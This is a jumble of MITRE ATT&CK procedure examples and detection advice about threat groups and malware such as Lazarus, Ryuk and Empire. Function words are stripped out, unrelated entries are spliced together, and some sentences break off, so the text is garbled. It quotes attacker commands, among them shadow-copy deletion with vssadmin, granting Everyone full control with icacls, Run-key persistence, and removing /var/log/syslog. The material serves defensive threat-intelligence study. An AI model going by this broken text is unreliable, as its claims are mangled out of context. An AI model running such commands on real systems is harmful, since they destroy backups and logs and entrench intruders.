communications.(Citation: ESET Turla Mosquito Jan 2018)(Citation: ESET Turla Mosquito 2018) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), implants batch scripting `cmd.exe` execution.(Citation: McAfee Honeybee)  (Citation: CrowdStrike Grim Spider 2019)(Citation: Sophos Ryuk Attack October 2020) [Kobalos](https://attack.mitre.org/software/S0641) decrypts strings initial communication, authentication process.(Citation: ESET Kobalos Jan 2021)  [APT38](https://attack.mitre.org/groups/G0082) enumerated network shares compromised host.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Aquatic Panda](https://attack.mitre.org/groups/G0143) acquired [njRAT](https://attack.mitre.org/software/S0385) operations.(Citation: CrowdStrike AQUATIC PANDA December 2021) User activity-based checks occur steps operation occur adversary learns environment. Data events viewed isolation, chain behavior lead activities, lateral movement, based obtained. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. Monitoring suspicious processes spawned gather variety perform forms Discovery, short period time, aid detection. [OilRig](https://attack.mitre.org/groups/G0049) spearphising emails malicious links potential victims.(Citation: Unit 42 OopsIE! Feb 2018) [PoshC2](https://attack.mitre.org/software/S0378) modules proxies command control.(Citation: GitHub PoshC2) [CaddyWiper](https://attack.mitre.org/software/S0693) enumerate files directories compromised host.(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 ) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [PowerSploit](https://attack.mitre.org/software/S0194)'s `Invoke-Kerberoast` module request encrypted service tickets bruteforce passwords Windows service accounts offline.(Citation: FoxIT Wocao December 2019) [DarkWatchman](https://attack.mitre.org/software/S0673) encodes data hexadecimal representation sending C2 server.(Citation: Prevailion DarkWatchman 2021) [DownPaper](https://attack.mitre.org/software/S0186) PowerShell add Registry key establish persistence.(Citation: ClearSky Charming Kitten Dec 2017) Enable firewall rules block unnecessary traffic network security zones network. Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  Examine data user’s SID-History attributes [Kasidet](https://attack.mitre.org/software/S0088) creates Registry key establish persistence.(Citation: Zscaler Kasidet)(Citation: Kasidet) [Small Sieve](https://attack.mitre.org/software/S1035) logged user.(Citation: NCSC GCHQ Sieve Jan 2022) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Leviathan](https://attack.mitre.org/groups/G0065) exploited multiple Office .NET vulnerabilities execution, including CVE-2017-0199, CVE-2017-8759, CVE-2017-11882.(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021)(Citation: Accenture MUDCARP March 2019) [Lazarus Group](https://attack.mitre.org/groups/G0032) delivered [RATANKBA](https://attack.mitre.org/software/S0241) malicious code victims compromised legitimate website.(Citation: RATANKBA)(Citation: Google TAG Lazarus Jan 2021) [Goopy](https://attack.mitre.org/software/S0477) ability disable Outlook's security policies disable macro warnings.(Citation: Cybereason Cobalt Kitty 2017)	 [AppleSeed](https://attack.mitre.org/software/S0622) exfiltrated files services.(Citation: KISA Operation Muzabi) [Cobalt Strike](https://attack.mitre.org/software/S0154) spawn job inject LSASS memory dump password hashes.(Citation: Cobalt Strike Manual 4.3 November 2020) [Suckfly](https://attack.mitre.org/groups/G0039) legitimate account credentials dumped navigate internal victim network legitimate account owner.(Citation: Symantec Suckfly 2016) [OutSteel](https://attack.mitre.org/software/S1017) automatically scan collect files specific extensions.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [APT16](https://attack.mitre.org/groups/G0023) compromised legitimate sites staging servers second-stage payloads.(Citation: FireEye EPS Awakens 2) (Citation: ClearSky Wilted Tulip July 2017) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors 7zr.exe add collected files archive.(Citation: Bitdefender FunnyDream Campaign November 2020) [HEXANE](https://attack.mitre.org/groups/G1001) cloud services, including OneDrive, C2.(Citation: POLONIUM June 2022) adversaries provisioned infrastructure (ex: server command control), internet scans proactively discover adversary acquired infrastructure. identifiable patterns services listening, certificates use, SSL/TLS negotiation features, response artifacts adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021) Detection efforts focused stages adversary lifecycle, Command Control. Monitor certificate requests (ex: EID 4886) issued certificates (ex: EID 4887) abnormal activity, including unexpected certificate enrollments signs abuse certificate attributes (such abusable EKUs).(Citation: SpecterOps Certified Pre Owned) [Chimera](https://attack.mitre.org/groups/G0114) <code>get -b <start ip> -e <end ip> -p</code> command network scanning custom Python tool  packed Windows executable named Get.exe scan IP ranges HTTP.(Citation: NCC Chimera January 2021) [APT37](https://attack.mitre.org/groups/G0067) leverages Windows API calls: VirtualAlloc(), WriteProcessMemory(), CreateRemoteThread() process injection.(Citation: Talos Group123) Monitor contextual data running process, include environment variables, image name, user/owner circumvent mechanisms designed control elevate privileges gain higher-level permissions. [FIN8](https://attack.mitre.org/groups/G0061) environment variables standard input (stdin) obfuscate command-line arguments. [FIN8](https://attack.mitre.org/groups/G0061) obfuscates malicious macros delivered payloads.(Citation: FireEye Obfuscation June 2017)(Citation: FireEye Enemy FIN8 Aug 2016)(Citation: Bitdefender FIN8 July 2021) [Flagpro](https://attack.mitre.org/software/S0696) download additional malware C2 server.(Citation: NTT Security Flagpro December 2021) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate obfuscation activity network level. [MuddyWater](https://attack.mitre.org/groups/G0069) malware upload additional files victim’s machine.(Citation: Securelist MuddyWater Oct 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: Reaqta MuddyWater November 2017)(Citation: Trend Micro Muddy Water March 2021) [Wizard Spider](https://attack.mitre.org/groups/G0102) identified domain admins “net ‘Domain admins’” commands.(Citation: DFIR Ryuk's Return October 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [Impacket](https://attack.mitre.org/software/S0357)'s smbexec.py accessing C$ IPC$ shares laterally.(Citation: FoxIT Wocao December 2019)  Monitor executed commands arguments [Valid Accounts](https://attack.mitre.org/techniques/T1078) log service designed accept remote connections, telnet, SSH, VNC. adversary perform actions logged-on user. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) [HyperStack](https://attack.mitre.org/software/S0537) connect IPC$ share remote machines.(Citation: Accenture HyperStack October 2020) [PoshC2](https://attack.mitre.org/software/S0378) modules brute forcing local administrator user accounts.(Citation: GitHub PoshC2) [Threat Group-3390](https://attack.mitre.org/groups/G0027) extensively strategic compromises target victims.(Citation: Dell TG-3390)(Citation: Securelist LuckyMouse June 2018) [Clop](https://attack.mitre.org/software/S0611) enumerate processes victim's machine.(Citation: Mcafee Clop Aug 2019) [Egregor](https://attack.mitre.org/software/S0554) tools gather users.(Citation: Intrinsec Egregor Nov 2020) Monitor file modifications collects file handle compare timestamp values (Citation: Unit 42 Tropic Trooper Nov 2016) [Attor](https://attack.mitre.org/software/S0438)'s dispatcher execute additional plugins loading respective DLLs.(Citation: ESET Attor Oct 2019) [RunningRAT](https://attack.mitre.org/software/S0253) code delete files victim’s machine.(Citation: McAfee Gold Dragon) Protect generated event files stored locally proper permissions authentication limit opportunities adversaries increase privileges preventing Privilege Escalation opportunities. [Silent Librarian](https://attack.mitre.org/groups/G0122) established e-mail accounts receive e-mails forwarded compromised accounts.(Citation: DOJ Iran Indictments March 2018) [Derusbi](https://attack.mitre.org/software/S0021) binds raw socket random source port 31800 31900 C2.(Citation: Fidelis Turbo) [ROKRAT](https://attack.mitre.org/software/S0240) delivered spearphishing emails malicious Hangul Office Word document.(Citation: Malwarebytes RokRAT VBA January 2021) [OSInfo](https://attack.mitre.org/software/S0165) enumerates current network connections <code> </code>.(Citation: Symantec Buckeye) [VBShower](https://attack.mitre.org/software/S0442) attempted complicate forensic analysis deleting files contained <code>%APPDATA%\..\Local\Temporary Internet Files\Content.Word</code> <code>%APPDATA%\..\Local Settings\Temporary Internet Files\Content.Word\</code>.(Citation: Kaspersky Cloud Atlas August 2019) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Aquatic Panda](https://attack.mitre.org/groups/G0143) attempted discover party endpoint detection response (EDR) tools compromised systems.(Citation: CrowdStrike AQUATIC PANDA December 2021) [BitPaymer](https://attack.mitre.org/software/S0570) attempts remove backup shadow files host <code>vssadmin.exe Delete Shadows /All /Quiet</code>.(Citation: Crowdstrike Indrik November 2018) [KeyBoy](https://attack.mitre.org/software/S0387) time-stomped DLL evade detection.(Citation: PWC KeyBoys Feb 2017) [Fysbis](https://attack.mitre.org/software/S0410) command <code>ls /etc | egrep -e"fedora\*|debian\*|gentoo\*|mandriva\*|mandrake\*|meego\*|redhat\*|lsb-\*|sun-\*|SUSE\*|release"</code> determine Linux OS version running.(Citation: Fysbis Palo Alto Analysis) Command monitoring reveal malicious attempts modify trust settings, installation root certificates modifications trust attributes/policies applied files. [Flagpro](https://attack.mitre.org/software/S0696) dropped executable file startup directory.(Citation: NTT Security Flagpro December 2021)  [Empire](https://attack.mitre.org/software/S0363) variety enumeration modules option API calls carry tasks.(Citation: Github PowerShell Empire) [Stuxnet](https://attack.mitre.org/software/S0603) driver scan specific filesystem driver objects.(Citation: Symantec W.32 Stuxnet Dossier) [Bumblebee](https://attack.mitre.org/software/S1039) inject code multiple processes infected endpoints.(Citation: Cybereason Bumblebee August 2022) [Melcoz](https://attack.mitre.org/software/S0530) DLL hijacking bypass security controls.(Citation: Securelist Brazilian Banking Malware July 2020) version [CHOPSTICK](https://attack.mitre.org/software/S0023) module monitors mounted volumes files extensions .doc, .docx, .pgp, .gpg, .m2f, .m2o.(Citation: ESET Sednit 2) [Darkhotel](https://attack.mitre.org/groups/G0012) malware series checks determine analyzed; checks include executable names, filename <code>.Md5.exe</code>, program executed root C:\ drive, checks sandbox-related libraries.(Citation: Lastline DarkHotel Time Decryption Nov 2015)(Citation: DUBNIUM June 2016) monitor service creation cmd.exe /k cmd.exe /c arguments detect RDP session hijacking. [StoneDrill](https://attack.mitre.org/software/S0380) obfuscated module alphabet-based table XOR encryption.(Citation: Kaspersky StoneDrill 2017) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors SMB files target systems.(Citation: FoxIT Wocao December 2019) [Dipsind](https://attack.mitre.org/software/S0200) encodes C2 traffic base64.(Citation: PLATINUM April 2016) Monitor analyze traffic patterns packet inspection LDAP MSRPC follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). [JHUHUGIT](https://attack.mitre.org/software/S0044) variant accesses screenshot saved clipboard converts JPG image.(Citation: Unit 42 Playbook Dec 2017) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors exploited multiple vulnerabilities externally facing servers.(Citation: Cybereason OperationCuckooBees 2022) [RogueRobin](https://attack.mitre.org/software/S0270) base64 encodes strings C2 DNS tunnel.(Citation: Unit 42 DarkHydrus July 2018) [Sykipot](https://attack.mitre.org/software/S0018) <code>netstat -ano</code> display active network connections.(Citation: AlienVault Sykipot 2011) [Earth Lusca](https://attack.mitre.org/groups/G1006) modified registry command <code>reg add “HKEY_CURRENT_USER\Environment” /v UserInitMprLogonScript /t REG_SZ /d “[file path]”</code> persistence.(Citation: TrendMicro EarthLusca 2022) Monitor files establish persistence elevate privileges mechanisms trigger execution based specific events. [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors source tools operations.(Citation: BlackBerry CostaRicto November 2020)  [Lazarus Group](https://attack.mitre.org/groups/G0032) malware attempts connect Windows shares lateral movement generated list usernames, center permutations username Administrator, weak passwords.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs) [RogueRobin](https://attack.mitre.org/software/S0270) Google Drive Command Control channel. (Citation: Unit42 DarkHydrus Jan 2019) [Lazarus Group](https://attack.mitre.org/groups/G0032) attempted users launch malicious Word attachment delivered spearphishing email.(Citation: McAfee Bankshot)(Citation: ClearSky Lazarus Aug 2020)(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [Ursnif](https://attack.mitre.org/software/S0386) hooked APIs screenshots.(Citation: TrendMicro Ursnif Mar 2015)(Citation: TrendMicro BKDR_URSNIF.SM) Ensure event tracers/forwarders (Citation: ETW 2018), firewall policies, mechanisms secured permissions access controls manipulated user accounts. [Moafee](https://attack.mitre.org/groups/G0002) employ binary padding.(Citation: Haq 2014) [LightNeuron](https://attack.mitre.org/software/S0395) configured automatically collect files directory.(Citation: ESET LightNeuron 2019) [MegaCortex](https://attack.mitre.org/software/S0576) entries Registry ransom contact information.(Citation: IBM MegaCortex) [TYPEFRAME](https://attack.mitre.org/software/S0263) variant force compromised function proxy server.(Citation: US-CERT TYPEFRAME June 2018) [IcedID](https://attack.mitre.org/software/S0483) utilzed encrypted binaries base64 encoded strings.(Citation: Juniper IcedID June 2020) (Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Volgmer](https://attack.mitre.org/software/S0180) gather list processes.(Citation: Symantec Volgmer Aug 2014) Monitor executed commands arguments bypass UAC mechanisms elevate process privileges system. [ROKRAT](https://attack.mitre.org/software/S0240) extract clipboard data compromised host.(Citation: Volexity InkySquid RokRAT August 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) digitally signed malware utilities evade detection.(Citation: ESET Lazarus Jun 2020)(Citation: Lazarus APT January 2022) Enabled features, Protected Process Light (PPL), LSA.(Citation: LSA) Properly configure firewalls proxies limit outgoing traffic ports network segment. enabling “Network access: storage passwords credentials network authentication” setting prevent network credentials stored Credential Manager.(Citation: Network access Credential Manager) [TA505](https://attack.mitre.org/groups/G0092) leveraged <code>rundll32.exe</code> execute malicious DLLs.(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019) [BloodHound](https://attack.mitre.org/software/S0521) enumerate collect properties domain computers, including domain controllers.(Citation: CrowdStrike BloodHound April 2018) [Remexi](https://attack.mitre.org/software/S0375) executes received commands wmic.exe (for WMI commands). (Citation: Securelist Remexi Jan 2019) Monitor file names mismatched file disk binary's metadata, indicator binary renamed compiled.  [BITTER](https://attack.mitre.org/groups/G1002) disguised malware Windows Security update service.(Citation: Cisco Talos Bitter Bangladesh 2022) [T9000](https://attack.mitre.org/software/S0098) Skype API record audio video calls. writes encrypted data <code>%APPDATA%\Intel\Skype</code>.(Citation: Palo Alto T9000 Feb 2016) [WarzoneRAT](https://attack.mitre.org/software/S0670) PowerShell download files execute commands.(Citation: Check Warzone Feb 2020)(Citation: Uptycs Warzone UAC Bypass November 2020) Monitor suspicious modification files authentication processes, configuration files module paths (e.g. `/etc/pam.d/`). system-integrity tools AIDE monitoring tools auditd monitor PAM files. monitor access certificates cryptographic material. [BabyShark](https://attack.mitre.org/software/S0414) ability decode downloaded files prior execution.(Citation: CISA AA20-301A Kimsuky) Malware [Group5](https://attack.mitre.org/groups/G0043) capable capturing keystrokes.(Citation: Citizen Lab Group5) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) malicious attachments email student targets India.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)  [TeamTNT](https://attack.mitre.org/groups/G0139) removed logs <code>/var/log/syslog</code>.(Citation: Aqua TeamTNT August 2020) (Citation: PWC Cloud Hopper Technical Annex April 2017) [TajMahal](https://attack.mitre.org/software/S0467) ability identify Internet Explorer (IE) version infected host.(Citation: Kaspersky TajMahal April 2019) Monitor windows registry values create modify system-level processes repeatedly execute malicious payloads persistence. Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions, aid manipulation data hide activity Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [APT29](https://attack.mitre.org/groups/G0016) SSH port forwarding capabilities public-facing systems, configured instance [Cobalt Strike](https://attack.mitre.org/software/S0154) network pipe SMB 2020 SolarWinds intrusion.(Citation: Symantec RAINDROP January 2021)(Citation: CrowdStrike StellarParticle January 2022) [BLINDINGCAN](https://attack.mitre.org/software/S0520) user C2 server POST requests.(Citation: NHS BLINDINGCAN Aug 2020)(Citation: US-CERT BLINDINGCAN Aug 2020) [MuddyWater](https://attack.mitre.org/groups/G0069) AES encrypt C2 responses.(Citation: Talos MuddyWater Jan 2022) [GeminiDuke](https://attack.mitre.org/software/S0049) collects network settings Internet proxy settings victim.(Citation: F-Secure Dukes) [GuLoader](https://attack.mitre.org/software/S0561) delete executable <code>AppData\Local\Temp</code> directory compromised host.(Citation: Unit 42 NETWIRE April 2020) [Gold Dragon](https://attack.mitre.org/software/S0249) checks running processes victim’s machine.(Citation: McAfee Gold Dragon) [Carbon](https://attack.mitre.org/software/S0335) decrypts task configuration files execution.(Citation: ESET Carbon Mar 2017)(Citation: Accenture HyperStack October 2020) [Okrum](https://attack.mitre.org/software/S0439)'s loader create service named NtmsSvc execute payload.(Citation: ESET Okrum July 2019) [APT41](https://attack.mitre.org/groups/G0096) DGAs change C2 servers monthly.(Citation: FireEye APT41 Aug 2019) Monitor API calls bypass process signature based defenses proxying execution malicious content signed, trusted, binaries.  [RainyDay](https://attack.mitre.org/software/S0629) ability switch TCP C2 method working.(Citation: Bitdefender Naikon April 2021) Restrict file shares specific directories access users. [Bad Rabbit](https://attack.mitre.org/software/S0606) rundll32 launch malicious DLL <code>C:Windowsinfpub.dat</code>.(Citation: Secure List Bad Rabbit) [POWERSTATS](https://attack.mitre.org/software/S0223) DDE execute additional payloads compromised hosts.(Citation: FireEye MuddyWater Mar 2018) [POLONIUM](https://attack.mitre.org/groups/G1005) tools AirVPN plink operations.(Citation: POLONIUM June 2022)  [Bisonal](https://attack.mitre.org/software/S0268) collected compromised host.(Citation: Talos Bisonal Mar 2020)  [ThiefQuest](https://attack.mitre.org/software/S0595) function <code>kill_unwanted</code> list running processes kills process matching list security processes.(Citation: wardle evilquest parti) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. establish persistence, [Truvasys](https://attack.mitre.org/software/S0178) adds Registry key "TaskMgr" attempt masquerade legitimate Windows Task Manager.(Citation: Win Defender Truvasys Sep 2017) [BoomBox](https://attack.mitre.org/software/S0635) ability mask malicious data strings PDF files.(Citation: MSTIC Nobelium Toolset 2021) [SUNSPOT](https://attack.mitre.org/software/S0562) malware designed insert [SUNBURST](https://attack.mitre.org/software/S0559) software builds SolarWinds Orion management product.(Citation: CrowdStrike SUNSPOT Implant January 2021) [HELLOKITTY](https://attack.mitre.org/software/S0617) delete volume shadow copies compromised hosts.(Citation: FireEye FiveHands April 2021) [ShimRat](https://attack.mitre.org/software/S0444) issued command function C2.(Citation: FOX-IT 2016 Mofang) [APT41](https://attack.mitre.org/groups/G0096)  svchost.exe [Net](https://attack.mitre.org/software/S0039) execute service installed launch [Cobalt Strike](https://attack.mitre.org/software/S0154) BEACON loader.(Citation: FireEye APT41 March 2020)(Citation: IB APT 41 June 2021) Monitor executed commands arguments employ detect avoid virtualization analysis environments. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. [Dipsind](https://attack.mitre.org/software/S0200) C2.(Citation: PLATINUM April 2016) [RTM](https://attack.mitre.org/software/S0148) add scheduled task establish persistence.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) [PyDCrypt](https://attack.mitre.org/software/S1032) [netsh](https://attack.mitre.org/software/S0108) RPC connections remote machines.(Citation: Checkpoint MosesStaff Nov 2021) (Citation: FireEye APT37 Feb 2018) [Crimson](https://attack.mitre.org/software/S0115) command list processes.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)	  [ZeroT](https://attack.mitre.org/software/S0230) retrieved stage 2 payloads Bitmap images Bit (LSB) steganography.(Citation: Proofpoint TA459 April 2017)(Citation: Proofpoint ZeroT Feb 2017) [NETEAGLE](https://attack.mitre.org/software/S0034) adversaries execute commands infected host.(Citation: FireEye APT30) Disable Autoruns unnecessary.(Citation: Disable Autorun) [Octopus](https://attack.mitre.org/software/S0340) achieved persistence placing malicious executable startup directory <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> key Registry.(Citation: Securelist Octopus Oct 2018) [Pupy](https://attack.mitre.org/software/S0192) communicate C2.(Citation: GitHub Pupy) adversaries leverage serverless functions infrastructure (ex: command control), unique characteristics adversary software, known.(Citation: ThreatConnect Infrastructure Dec 2020) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle.  [njRAT](https://attack.mitre.org/software/S0385) enumerates current user initial infection.(Citation: Fidelis njRAT June 2013) [Ryuk](https://attack.mitre.org/software/S0446) launch <code>icacls <path> /grant Everyone:F /T /C /Q</code> delete access-based restrictions files directories.(Citation: ANSSI RYUK RANSOMWARE) [RegDuke](https://attack.mitre.org/software/S0511) extract execute PowerShell scripts C2 communications.(Citation: ESET Dukes October 2019) [Remsec](https://attack.mitre.org/software/S0125) dump SAM database.(Citation: Kaspersky ProjectSauron Technical Analysis) Monitor executed commands arguments actions gather... [Earth Lusca](https://attack.mitre.org/groups/G1006) VBA script execute WMI.(Citation: TrendMicro EarthLusca 2022) [Chimera](https://attack.mitre.org/groups/G0114) <code>quser</code> command logged users.(Citation: NCC Chimera January 2021)   (Citation: Cylance Shaheen Nov 2018) [Chimera](https://attack.mitre.org/groups/G0114) <code>net user</code> account discovery.(Citation: NCC Chimera January 2021) [xCaon](https://attack.mitre.org/software/S0653) checked existence Kaspersky antivirus software system.(Citation: Checkpoint IndigoZebra July 2021) [Higaisa](https://attack.mitre.org/groups/G0126) victim identifier User-Agent string C2 server minutes.(Citation: PTSecurity Higaisa 2020) detecting user scope abuse COR_PROFILER variable, monitor Registry COR_ENABLE_PROFILING, COR_PROFILER, COR_PROFILER_PATH correspond user environment variables correlate developer tools. application control configured block execution Odbcconf.exe required network prevent potential misuse adversaries. Ensure proper permissions set Registry hives prevent users modifying components lead privilege escalation. [FoggyWeb](https://attack.mitre.org/software/S0661)'s loader API functions load [FoggyWeb](https://attack.mitre.org/software/S0661) backdoor Application Domain legitimate FS managed code executed.(Citation: MSTIC FoggyWeb September 2021) [Kessel](https://attack.mitre.org/software/S0487) trojanized <sode>ssh_login</code> <code>user-auth_pubkey</code> functions steal plaintext credentials.(Citation: ESET ForSSHe December 2018) [njRAT](https://attack.mitre.org/software/S0385) persistence Registry key <code>HKCU\Software\Microsoft\CurrentVersion\Run\</code> dropped shortcut <code>%STARTUP%</code>.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018) Monitor files abuse Office "Office Test" Registry key persistence compromised system. Monitor analyze traffic patterns packet inspection web-based network connections malicious suspicious detinations (e.g. destinations attributed phishing campaigns). correlation process monitoring command detect anomalous processes execution command arguments (e.g. monitor anomalies files initiate network connections unusual connections initiated regsvr32.exe, rundll.exe, .SCF, HTA, MSI, DLLs, msiexec.exe). multi-factor authentication public-facing webmail servers recommended practice minimize usernames passwords adversaries. Monitor processes command-line arguments actions create modify services. Command-line invocation tools capable adding modifying services unusual, depending systems typically environment. Services modified Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001), additional logging configured gather data. collect service utility execution service binary path arguments analysis. Service binary paths changed execute commands scripts. [Final1stspy](https://attack.mitre.org/software/S0355) obtains victim Windows version CPU architecture.(Citation: Unit 42 Nokki Oct 2018) [MegaCortex](https://attack.mitre.org/software/S0576) wipe deleted data drives <code>cipher.exe</code>.(Citation: IBM MegaCortex) [Turian](https://attack.mitre.org/software/S0647) WinRAR create password-protected archive files interest.(Citation: ESET BackdoorDiplomacy Jun 2021) Monitor newly executed processes control preexisting sessions remote services laterally environment. [SDBbot](https://attack.mitre.org/software/S0461) ability identify OS version, OS bit name.(Citation: Proofpoint TA505 October 2019)(Citation: Korean FSI TA505 2020) [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors established watering hole hosted login legitimate Israeli shipping company active November 2021.(Citation: Mandiant UNC3890 Aug 2022) [Grandoreiro](https://attack.mitre.org/software/S0531) delete .LNK files created Startup folder.(Citation: ESET Grandoreiro April 2020) [Empire](https://attack.mitre.org/software/S0363) WMI deliver payload remote host.(Citation: Github PowerShell Empire)  [BLINDINGCAN](https://attack.mitre.org/software/S0520) collected victim machine's local IP address MAC address.(Citation: US-CERT BLINDINGCAN Aug 2020) [FunnyDream](https://attack.mitre.org/software/S1044) check time determine files.(Citation: Bitdefender FunnyDream Campaign November 2020) [HARDRAIN](https://attack.mitre.org/software/S0246) cmd.exe execute <code>netsh</code>commands.(Citation: US-CERT HARDRAIN March 2018) Enable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor analyze error events failed trust validation (Event 81, event subverted hijacked trust provider components) events (ex: successful validations). Code Integrity event logging provide valuable indicators malicious SIP trust provider loads, protected processes attempt load maliciously-crafted trust validation component fail (Event 3033). (Citation: SpectorOps Subverting Trust Sept 2017) [APT37](https://attack.mitre.org/groups/G0067) exploits Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 CVE-2020-26411), Edge (CVE-2021-26411) execution.(Citation: Securelist ScarCruft Jun 2016)(Citation: FireEye APT37 Feb 2018)(Citation: Talos Group123)(Citation: Volexity InkySquid BLUELIGHT August 2021) [TEMP.Veles](https://attack.mitre.org/groups/G0088) relied encrypted SSH-based tunnels transfer tools remote command/program execution.(Citation: FireEye TRITON 2019) [HermeticWiper](https://attack.mitre.org/software/S0697) decompress driver files `LZCopy`.(Citation: Crowdstrike DriveSlayer February 2022) [SILENTTRINITY](https://attack.mitre.org/software/S0692) remove files compromised host.(Citation: GitHub SILENTTRINITY Modules July 2019) Monitor newly executed processes modify XDG autostart entries execute programs commands boot. [LitePower](https://attack.mitre.org/software/S0680) API calls.(Citation: Kaspersky WIRTE November 2021) [Gorgon Group](https://attack.mitre.org/groups/G0078) <code>-W Hidden</code> conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows setting WindowStyle parameter hidden. (Citation: Unit 42 Gorgon Aug 2018) variant [ADVSTORESHELL](https://attack.mitre.org/software/S0045) encrypts C2 3DES.(Citation: Bitdefender APT28 Dec 2015) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) obfuscated wallet address payload binary.(Citation: RedCanary Mockingbird 2020) [Umbreon](https://attack.mitre.org/software/S0221) additional access backdoor Espeon, providing reverse receipt special packet.(Citation: Umbreon Trend Micro) [Remexi](https://attack.mitre.org/software/S0375) decrypts configuration data XOR 25-character keys.(Citation: Securelist Remexi Jan 2019) [Pay2Key](https://attack.mitre.org/software/S0556) ability gather hostname victim machine.(Citation: Check Pay2Key November 2020) Limit credential overlap accounts systems training users administrators password multiple accounts. [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors phishing emails included PDF document led download execution malware.(Citation: ESET Operation Spalax Jan 2021) [Stuxnet](https://attack.mitre.org/software/S0603) ability generate C2 domains.(Citation: Symantec W.32 Stuxnet Dossier) [Lokibot](https://attack.mitre.org/software/S0447)'s stage DLL set timer “timeSetEvent” schedule execution.(Citation: Talos Lokibot Jan 2021) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Silence](https://attack.mitre.org/groups/G0091) [Winexe](https://attack.mitre.org/software/S0191) install service remote system.(Citation: SecureList Silence Nov 2017)(Citation: IB Silence Sept 2018) [BITTER](https://attack.mitre.org/groups/G1002) registered domains stage payloads.(Citation: Forcepoint BITTER Pakistan Oct 2016) 
Block SMB traffic exiting enterprise network egress filtering blocking TCP ports 139, 445 UDP port 137. Filter block WebDAV protocol traffic exiting network. access external resources SMB WebDAV necessary, traffic tightly limited allowlisting. (Citation: US-CERT SMB Security) (Citation: US-CERT APT Energy Oct 2017) [Gazer](https://attack.mitre.org/software/S0168) commands delete files persistence mechanisms victim.(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) [Emissary](https://attack.mitre.org/software/S0082) capability download files C2 server.(Citation: Lotus Blossom Dec 2015) [InvisiMole](https://attack.mitre.org/software/S0260) Data Protection API encrypt components victim’s computer, evade detection, payload decrypted loaded specific compromised computer.(Citation: ESET InvisiMole June 2020) Monitor user accounts logged systems access access patterns multiple systems short period time. [CreepySnail](https://attack.mitre.org/software/S1024) `getmac` `Get-NetIPAddress` enumerate network settings.(Citation: POLONIUM June 2022) [Empire](https://attack.mitre.org/software/S0363) multiple modules injecting processes, <code>Invoke-PSInject</code>.(Citation: Github PowerShell Empire) Monitor Windows API calls Windows Event Logs hide activity intrusion. 